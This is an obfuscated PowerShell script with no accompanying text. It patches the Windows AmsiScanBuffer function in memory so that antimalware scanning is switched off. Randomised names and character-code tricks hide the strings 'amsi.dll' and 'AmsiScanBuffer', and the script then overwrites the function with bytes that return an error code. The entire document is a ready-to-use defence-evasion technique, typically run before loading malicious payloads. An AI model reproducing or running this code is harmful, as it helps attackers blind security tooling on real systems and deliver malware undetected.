$sELNZhfmhs = @"
using System;
using System.Runtime.InteropServices;
public class sELNZhfmhs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr xVZimHbG6L_jJ_AA, string kDJyeuIHKCj7);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr hhQm34sWuJKc, UIntPtr yM8S_WSIlTTtFZ, uint v4e4, out uint uB0yl3In4Ef);
}
"@

Add-Type $sELNZhfmhs

$bpKJSogeZF8Q7 = [sELNZhfmhs]::LoadLibrary("$([chaR]([ByTe]0x61)+[Char](109+46-46)+[CHaR](115*50/50)+[chAR]([byTe]0x69)+[CHAr]([BYTe]0x2e)+[char]([bYtE]0x64)+[cHAR](102+6)+[ChAr](67+41))")
$MJkfm3M = [sELNZhfmhs]::GetProcAddress($bpKJSogeZF8Q7, "$(('ÁmsìScã'+'nBúffér').nOrMALIZE([ChaR](70*48/48)+[Char](30+81)+[cHar]([BytE]0x72)+[CHaR]([BYTE]0x6d)+[ChaR]([BYte]0x44)) -replace [Char](6+86)+[cHAR]([byTE]0x70)+[CHaR]([bYTe]0x7b)+[CHar]([BYTE]0x4d)+[CHar]([byTe]0x6e)+[CHAR]([Byte]0x7d))")
$p = 0
[sELNZhfmhs]::VirtualProtect($MJkfm3M, [uint32]5, 0x40, [ref]$p)
$Em7sN = "0xB8"
$crgRnwLCqrxRl = "0x57"
$aqRR = "0x00"
$RJ_Q0TNi9ky1MgJmeFO6 = "0x07"
$MDh2jU_cm = "0x80"
$NxDtHs4GBuEif = "0xC3"
$TS6uSi5r0iUo = [Byte[]] ($Em7sN,$crgRnwLCqrxRl,$aqRR,$RJ_Q0TNi9ky1MgJmeFO6,+$MDh2jU_cm,+$NxDtHs4GBuEif)
[System.Runtime.InteropServices.Marshal]::Copy($TS6uSi5r0iUo, 0, $MJkfm3M, 6)